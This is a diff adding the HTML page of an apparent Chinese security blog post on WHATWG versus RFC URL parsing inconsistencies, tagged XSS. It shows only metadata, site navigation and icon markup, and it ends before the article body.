@@ -1,0 +1,1732 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr" class="scroll-smooth" data-default-appearance="light"
+  data-auto-appearance="true"><head>
+  <meta charset="utf-8" />
+  
+  <meta http-equiv="content-language" content="zh-cn" />
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+  
+  <title>对WHATWG URL标准与RFC URL标准不一致性的研究 &middot; 1337妙妙屋</title>
+  <meta name="title" content="对WHATWG URL标准与RFC URL标准不一致性的研究 &middot; 1337妙妙屋" />
+  
+  
+  <meta name="keywords" content="XSS, " />
+  
+  
+  <link rel="canonical" href="https://shangrui-hash.github.io/posts/a_research_of_inconsistencies_in_front_and_backend_url_parsers.en/" />
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  <link type="text/css" rel="stylesheet" href="/css/main.bundle.min.1c9cd0d1ebaf117272b5c4f6bd49878475cb210d5e0da4f061632d779f5bb46851881c187e6e634dba5071c4e3d80e7d5cec1dd80443b2fa68acd358f9eda881.css"
+    integrity="sha512-HJzQ0euvEXJytcT2vUmHhHXLIQ1eDaTwYWMtd59btGhRiBwYfm5jTbpQccTj2A59XOwd2ARDsvporNNY&#43;e2ogQ==" />
+  
+  
+  <script type="text/javascript" src="/js/appearance.min.516a16745bea5a9bd011138d254cc0fd3973cd55ce6e15f3dec763e7c7c2c7448f8fe7b54cca811cb821b0c7e12cd161caace1dd794ac3d34d40937cbcc9ee12.js"
+    integrity="sha512-UWoWdFvqWpvQERONJUzA/TlzzVXObhXz3sdj58fCx0SPj&#43;e1TMqBHLghsMfhLNFhyqzh3XlKw9NNQJN8vMnuEg=="></script>
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  <script defer type="text/javascript" id="script-bundle" src="/js/main.bundle.min.f7f2ca6be7475eb54e22282d15a66c0b5afba16e517e3c40e52197911d057d5c8c3cb71c86e5664e88a2a27dc627f321d2a77cc2ab72adafd83fdd83a40ec304.js"
+    integrity="sha512-9/LKa&#43;dHXrVOIigtFaZsC1r7oW5RfjxA5SGXkR0FfVyMPLcchuVmToiion3GJ/Mh0qd8wqtyra/YP92DpA7DBA==" data-copy="" data-copied=""></script>
+  
+  
+  
+  <script src="/lib/zoom/zoom.min.37d2094687372da3f7343a221a470f6b8806f7891aa46a5a03966af7f0ebd38b9fe536cb154e6ad28f006d184b294525a7c4054b6bbb4be62d8b453b42db99bd.js" integrity="sha512-N9IJRoc3LaP3NDoiGkcPa4gG94kapGpaA5Zq9/Dr04uf5TbLFU5q0o8AbRhLKUUlp8QFS2u7S&#43;Yti0U7QtuZvQ=="></script>
+  
+  
+  
+  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
+  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
+  <link rel="manifest" href="/site.webmanifest" />
+  
+  
+  
+  
+  
+  
+  
+  
+  <meta property="og:title" content="对WHATWG URL标准与RFC URL标准不一致性的研究" />
+<meta property="og:description" content="2022年8月份在挖天融信SRC的时候，发现天融信的某个站点使用了redacted系统，于是便在github上下载了redacted的源码，审计了一下。" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://shangrui-hash.github.io/posts/a_research_of_inconsistencies_in_front_and_backend_url_parsers.en/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-03-17T18:12:41+08:00" />
+<meta property="article:modified_time" content="2023-03-17T18:12:41+08:00" />
+
+  <meta name="twitter:card" content="summary"/><meta name="twitter:title" content="对WHATWG URL标准与RFC URL标准不一致性的研究"/>
+<meta name="twitter:description" content="2022年8月份在挖天融信SRC的时候，发现天融信的某个站点使用了redacted系统，于是便在github上下载了redacted的源码，审计了一下。"/>
+
+  
+  <script type="application/ld+json">
+  [{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "articleSection": "Posts",
+    "name": "对WHATWG URL标准与RFC URL标准不一致性的研究",
+    "headline": "对WHATWG URL标准与RFC URL标准不一致性的研究",
+    
+    "abstract": "2022年8月份在挖天融信SRC的时候，发现天融信的某个站点使用了redacted系统，于是便在github上下载了redacted的源码，审计了一下。",
+    "inLanguage": "zh-cn",
+    "url" : "https:\/\/shangrui-hash.github.io\/posts\/a_research_of_inconsistencies_in_front_and_backend_url_parsers.en\/",
+    "author" : {
+      "@type": "Person",
+      "name": "无在无不在"
+    },
+    "copyrightYear": "2023",
+    "dateCreated": "2023-03-17T18:12:41\u002b08:00",
+    "datePublished": "2023-03-17T18:12:41\u002b08:00",
+    
+    "dateModified": "2023-03-17T18:12:41\u002b08:00",
+    
+    "keywords": ["XSS"],
+    
+    "mainEntityOfPage": "true",
+    "wordCount": "1383"
+  }]
+  </script>
+
+
+  
+  
+  <meta name="author" content="无在无不在" />
+  
+  
+  
+  <link href="https://x.com/RuiShang9" rel="me" />
+  
+  
+  <link href="https://github.com/ShangRui-hash" rel="me" />
+  
+  
+  
+  
+
+<script src="/lib/jquery/jquery.slim.min.b0dca576e87d7eaa5850ae4e61759c065786cdb6489d68fcc82240539eebd5da522bdb4fda085ffd245808c8fe2acb2516408eb774ef26b5f6015fc6737c0ea8.js" integrity="sha512-sNylduh9fqpYUK5OYXWcBleGzbZInWj8yCJAU57r1dpSK9tP2ghf/SRYCMj&#43;KsslFkCOt3TvJrX2AV/Gc3wOqA=="></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-106B2GZYFQ"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-106B2GZYFQ');
+</script>
+
+
+
+  
+  
+  <meta name="theme-color"/>
+  
+  
+</head>
+<body
+  class="flex flex-col h-screen px-6 m-auto text-lg leading-7 max-w-7xl bg-neutral text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32 scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600">
+  <div id="the-top" class="absolute flex self-center">
+    <a class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600"
+      href="#main-content"><span
+        class="font-bold text-primary-600 ltr:pr-2 rtl:pl-2 dark:text-primary-400">&darr;</span>跳过正文</a>
+  </div>
+  
+  
+  <div style="padding-left:0;padding-right:0;padding-top:2px;padding-bottom:3px"
+    class="main-menu flex items-center justify-between px-4 py-6 sm:px-6 md:justify-start gap-x-3">
+    
+    <div class="flex flex-1 items-center justify-between">
+        <nav class="flex space-x-3">
+
+            
+            <a href="/" class="text-base font-medium text-gray-500 hover:text-gray-900">1337妙妙屋</a>
+            
+
+        </nav>
+        <nav class="hidden md:flex items-center gap-x-5 md:ml-12 h-12">
+
+            
+            
+            
+  <a href="/posts/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+    
+    <p class="text-base font-medium" title="">
+        Blog
+    </p>
+</a>
+
+
+
+            
+            
+  <a href="/about/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+    
+    <p class="text-base font-medium" title="">
+        About
+    </p>
+</a>
+
+
+
+            
+            
+  <a href="https://github.com/ShangRui-hash"  target="_blank"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+    
+    <span >
+        
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+
+  </span>
+
+
+    </span>
+    
+    <p class="text-base font-medium" title="">
+        
+    </p>
+</a>
+
+
+
+            
+            
+
+            
+
+
+            
+            <button id="search-button" aria-label="Search" class="text-base hover:text-primary-600 dark:hover:text-primary-400"
+                title="">
+                
+
+  <span class="relative block icon">
+    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+
+  </span>
+
+
+            </button>
+            
+
+
+            
+            
+            <div
+                class=" flex items-center">
+                <button id="appearance-switcher" aria-label="Dark mode switcher" type="button" class="text-base hover:text-primary-600 dark:hover:text-primary-400">
+                    <div class="flex items-center justify-center dark:hidden">
+                        
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
+
+  </span>
+
+
+                    </div>
+                    <div class="items-center justify-center hidden dark:flex">
+                        
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
+
+  </span>
+
+
+                    </div>
+                </button>
+            </div>
+            
+
+        </nav>
+        <div class="flex md:hidden items-center gap-x-5 md:ml-12 h-12">
+
+            <span></span>
+
+            
+
+
+            
+            <button id="search-button-mobile" aria-label="Search" class="text-base hover:text-primary-600 dark:hover:text-primary-400"
+                title="">
+                
+
+  <span class="relative block icon">
+    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+
+  </span>
+
+
+            </button>
+            
+
+            
+            
+            <button id="appearance-switcher-mobile" aria-label="Dark mode switcher" type="button" class="text-base hover:text-primary-600 dark:hover:text-primary-400 ltr:mr-1 rtl:ml-1">
+                <div class="flex items-center justify-center dark:hidden">
+                    
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
+
+  </span>
+
+
+                </div>
+                <div class="items-center justify-center hidden dark:flex">
+                    
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
+
+  </span>
+
+
+                </div>
+            </button>
+            
+
+        </div>
+    </div>
+    <div class="-my-2 md:hidden">
+
+        <label id="menu-button" class="block">
+            
+            <div class="cursor-pointer hover:text-primary-600 dark:hover:text-primary-400">
+                
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M0 96C0 78.33 14.33 64 32 64H416C433.7 64 448 78.33 448 96C448 113.7 433.7 128 416 128H32C14.33 128 0 113.7 0 96zM0 256C0 238.3 14.33 224 32 224H416C433.7 224 448 238.3 448 256C448 273.7 433.7 288 416 288H32C14.33 288 0 273.7 0 256zM416 448H32C14.33 448 0 433.7 0 416C0 398.3 14.33 384 32 384H416C433.7 384 448 398.3 448 416C448 433.7 433.7 448 416 448z"/></svg>
+
+  </span>
+
+
+            </div>
+            <div id="menu-wrapper" style="padding-top:5px;"
+                class="fixed inset-0 z-30 invisible w-screen h-screen m-0 overflow-auto transition-opacity opacity-0 cursor-default bg-neutral-100/50 backdrop-blur-sm dark:bg-neutral-900/50">
+                <ul
+                    class="flex space-y-2 mt-3 flex-col items-end w-full px-6 py-6 mx-auto overflow-visible list-none ltr:text-right rtl:text-left max-w-7xl">
+
+                    <li id="menu-close-button">
+                        <span
+                            class="cursor-pointer inline-block align-text-bottom hover:text-primary-600 dark:hover:text-primary-400">
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+
+  </span>
+
+</span>
+                    </li>
+
+                    
+
+                    
+  <li class="mt-1">
+    <a href="/posts/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+        
+        <p class="text-bg font-bg" title="">
+            Blog
+        </p>
+    </a>
+</li>
+
+
+
+
+                    
+
+                    
+  <li class="mt-1">
+    <a href="/about/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+        
+        <p class="text-bg font-bg" title="">
+            About
+        </p>
+    </a>
+</li>
+
+
+
+
+                    
+
+                    
+  <li class="mt-1">
+    <a href="https://github.com/ShangRui-hash"  target="_blank"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+        
+        <div >
+            
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+
+  </span>
+
+
+        </div>
+        
+        <p class="text-bg font-bg" title="">
+            
+        </p>
+    </a>
+</li>
+
+
+
+
+                    
+
+                </ul>
+                
+                
+
+            </div>
+        </label>
+    </div>
+</div>
+
+
+
+
+
+  
+  <div class="relative flex flex-col grow">
+    <main id="main-content" class="grow">
+      
+
+
+<article>
+  
+
+  <header id="single_header" class="mt-5 max-w-prose">
+    
+    <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
+      对WHATWG URL标准与RFC URL标准不一致性的研究
+    </h1>
+    <div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
+      
+
+
+
+
+
+  
+  
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+<div class="flex flex-row flex-wrap items-center">
+  
+  
+  <time datetime="2023-03-17T18:12:41&#43;08:00">17 March 2023</time><span class="px-2 text-primary-500">&middot;</span><span>1383 字</span><span class="px-2 text-primary-500">&middot;</span><span title="预计阅读">7 分钟</span><span class="px-2 text-primary-500">&middot;</span>
+
+
+<script type="text/javascript" src="/js/zen-mode.min.eea5245cf9244ecbdf2c150d1c8833226c1541cadf6e98f63a7c9192b1a3676df2c3ec603b14f4cfaaa53971fd9d8955640c0f405bf3de2b43ee7a5fb29ae721.js" integrity="sha512-7qUkXPkkTsvfLBUNHIgzImwVQcrfbpj2OnyRkrGjZ23yw&#43;xgOxT0z6qlOXH9nYlVZAwPQFvz3itD7npfsprnIQ=="></script>
+
+<span class="mb-[2px]">
+    <span id="zen-mode-button"
+          class="text-lg hover:text-primary-500"
+          title=""
+          data-title-i18n-disable=""
+          data-title-i18n-enable="">
+        <span class="inline-block align-text-bottom">
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 50 50" width="50px" height="50px">
+    <path fill="currentColor" d="M 12.980469 4 C 9.1204688 4 5.9804688 7.14 5.9804688 11 L 6 26 L 9.9804688 26 L 9.9804688 11 C 9.9804688 9.35 11.320469 8 12.980469 8 L 40.019531 8 C 41.679531 8 43.019531 9.35 43.019531 11 L 43.019531 39 C 43.019531 40.65 41.679531 42 40.019531 42 L 29 42 C 29 43.54 28.420938 44.94 27.460938 46 L 40.019531 46 C 43.879531 46 47.019531 42.86 47.019531 39 L 47.019531 11 C 47.019531 7.14 43.879531 4 40.019531 4 L 12.980469 4 z M 7 28 C 4.794 28 3 29.794 3 32 L 3 42 C 3 44.206 4.794 46 7 46 L 23 46 C 25.206 46 27 44.206 27 42 L 27 32 C 27 29.794 25.206 28 23 28 L 7 28 z M 7 32 L 23 32 L 23.001953 42 L 7 42 L 7 32 z"/>
+</svg>
+  </span>
+
+</span>
+    </span>
+</span>
+  
+
+  
+  
+</div>
+
+
+<div class="flex flex-row flex-wrap items-center">
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+</div>
+
+
+
+
+<div class="flex flex-row flex-wrap items-center">
+  
+  
+  
+  
+  
+  
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/categories/story/&#34;,'_self');return false;">
+    <span class="flex" style="cursor: pointer;">
+  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Story
+  </span>
+</span>
+  </span>
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/xss/&#34;,'_self');return false;">
+    <span class="flex" style="cursor: pointer;">
+  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    XSS
+  </span>
+</span>
+  </span>
+  
+  
+  
+  
+</div>
+
+
+
+
+    </div>
+
+    
+    
+    
+    
+    
+
+    
+
+    
+      
+      
+        
+        
+<div class="flex author">
+  
+    
+    
+      
+    
+    
+      
+        
+      
+      <img class="!mt-0 !mb-0 h-24 w-24 rounded-full ltr:mr-4 rtl:ml-4" width="96" height="96"
+      alt="无在无不在" src="/ava_huc82d7b839fc53b7a5c86bd3cdfedcac6_357652_192x192_fill_q75_box_center.jpg" />
+    
+  
+  <div class="place-self-center">
+    
+    <div class="text-[0.6rem] uppercase leading-3 text-neutral-500 dark:text-neutral-400">
+      作者
+    </div>
+    <div class="font-semibold leading-6 text-neutral-800 dark:text-neutral-300">
+      无在无不在
+    </div>
+    
+    
+    <div class="text-2xl sm:text-lg">
+  <div class="flex flex-wrap text-neutral-400 dark:text-neutral-500">
+    
+      
+        <a
+          class="px-1 hover:text-primary-700 dark:hover:text-primary-400"
+          href="https://x.com/RuiShang9"
+          target="_blank"
+          aria-label="Twitter"
+          rel="me noopener noreferrer"
+          ><span class="inline-block align-text-bottom">
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"/></svg>
+
+  </span>
+
+</span></a
+        >
+      
+    
+      
+        <a
+          class="px-1 hover:text-primary-700 dark:hover:text-primary-400"
+          href="https://github.com/ShangRui-hash"
+          target="_blank"
+          aria-label="Github"
+          rel="me noopener noreferrer"
+          ><span class="inline-block align-text-bottom">
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 